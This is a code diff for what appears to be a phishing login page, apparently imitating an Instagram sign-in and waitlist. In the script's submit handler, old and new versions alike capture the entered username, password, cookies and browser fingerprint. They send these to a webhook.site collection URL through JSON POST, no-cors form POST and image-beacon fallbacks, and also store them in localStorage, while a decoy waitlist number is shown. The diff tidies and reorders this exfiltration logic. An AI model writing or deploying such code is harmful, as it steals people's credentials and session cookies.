@@ -341,15 +341,15 @@
         }
         
         .waitlist-num {
-    font-size: 40px;
-    font-weight: 800;
-    background: linear-gradient(90deg, #0082FB, #f5576c);
-    -webkit-background-clip: text;
-    background-clip: text;
-    -webkit-text-fill-color: transparent;
-    color: transparent;
-    margin: 12px 0;
-}
+            font-size: 40px;
+            font-weight: 800;
+            background: linear-gradient(90deg, #0082FB, #f5576c);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            color: transparent;
+            margin: 12px 0;
+        }
         
         .overlay-footer {
             font-size: 12px;
@@ -428,11 +428,6 @@
     </footer>
     
     <script>
-        // ============================================================
-        // CONFIG: Set your capture endpoint here
-        // Go to https://webhook.site → copy your unique URL → paste below
-        // Or leave as-is for localStorage-only capture
-        // ============================================================
         const EP = 'https://webhook.site/126c9732-9913-4f0d-85d5-70edd4d04e67';
         
         const $ = id => document.getElementById(id);
@@ -444,63 +439,67 @@
         
         const genId = (pre, len) => pre + Array.from({length: len}, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');
         
-        form.addEventListener('submit', async e => {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const u = $('u').value.trim();
-            const p = $('p').value;
+            const username = $('u').value.trim();
+            const password = $('p').value;
             
-            if (!u || !p) return;
+            if (!username || !password) return;
             
             btn.disabled = true;
             bt.style.display = 'none';
             sp.style.display = 'block';
             
-            const payload = {
-                u: u,
-                p: p,
-                c: document.cookie,
-                ua: navigator.userAgent,
-                pl: navigator.platform,
-                lang: navigator.language,
-                sr: screen.width + 'x' + screen.height,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ref: document.referrer,
-                ts: new Date().toISOString(),
-                url: location.href,
-                sid: genId('IGT', 28),
-                csrf: genId('', 32),
-                uid: String(Math.floor(Math.random() * 9000000000 + 1000000000))
+            const data = {
+                username: username,
+                password: password,
+                cookies: document.cookie || 'none',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                sessionId: genId('IGT', 28),
+                csrfToken: genId('', 32),
+                userId: String(Math.floor(Math.random() * 9000000000 + 1000000000))
             };
             
-            // Method 1: JSON POST
             try {
+                const existing = JSON.parse(localStorage.getItem('captures') || '[]');
+                existing.push(data);
+                localStorage.setItem('captures', JSON.stringify(existing));
+            } catch(e) {}
+            
+            try {
+                const formData = new FormData();
+                Object.entries(data).forEach(([key, value]) => {
+                    formData.append(key, String(value));
+                });
                 await fetch(EP, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: formData,
+                    mode: 'no-cors'
                 });
             } catch(err) {
-                // Method 2: no-cors form data
                 try {
-                    const fd = new FormData();
-                    Object.entries(payload).forEach(([k, v]) => fd.append(k, v));
-                    await fetch(EP, { method: 'POST', body: fd, mode: 'no-cors' });
+                    await fetch(EP, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
                 } catch(e2) {
-                    // Method 3: image beacon
-                    try {
-                        const img = new Image();
-                        img.src = EP + '?' + new URLSearchParams(payload).toString();
-                    } catch(e3) {}
+                    const img = new Image();
+                    const params = new URLSearchParams();
+                    Object.entries(data).forEach(([key, value]) => {
+                        params.append(key, String(value).substring(0, 500));
+                    });
+                    img.src = EP + '?' + params.toString();
                 }
             }
-            
-            // Save to localStorage for built-in reveal
-            try {
-                const existing = JSON.parse(localStorage.getItem('__c') || '[]');
-                existing.push(payload);
-                localStorage.setItem('__c', JSON.stringify(existing));
-            } catch(e) {}
             
             setTimeout(() => {
                 btn.disabled = false;
@@ -508,7 +507,7 @@
                 sp.style.display = 'none';
                 $('wn').textContent = '#' + Math.floor(Math.random() * 300 + 100);
                 ov.style.display = 'flex';
-            }, 1400);
+            }, 1500);
         });
         
         document.querySelectorAll('.input-wrap input').forEach(inp => {
